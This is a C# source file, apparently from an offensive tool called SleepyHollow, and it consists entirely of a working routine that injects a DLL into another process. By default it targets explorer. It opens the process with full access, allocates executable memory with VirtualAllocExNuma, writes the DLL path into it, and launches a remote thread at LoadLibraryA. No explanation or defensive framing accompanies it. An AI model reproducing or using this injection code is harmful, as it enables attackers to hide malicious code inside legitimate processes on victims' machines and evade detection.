using System.Diagnostics;
using System.Text;

namespace SleepyHollow;

internal static class InjectDLL
{
    internal static Task Run(string dllName, string processName = "explorer")
    {
        var pid = Process.GetProcessesByName(processName)[0].Id;
        IntPtr hProcess = Lib.OpenProcess(OpenProcessFlags.PROCESS_ALL_ACCESS, false, pid);
        IntPtr lpAddress = Lib.VirtualAllocExNuma(hProcess, IntPtr.Zero, 0x1000, Lib.MEM_COMMIT_AND_RESERVE, Lib.PAGE_EXECUTE_READWRITE, 0);
        IntPtr outSize;
        Boolean res = Lib.WriteProcessMemory(hProcess, lpAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = Lib.GetProcAddress(Lib.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, lpAddress, 0, IntPtr.Zero);
        return Task.CompletedTask;
    }
}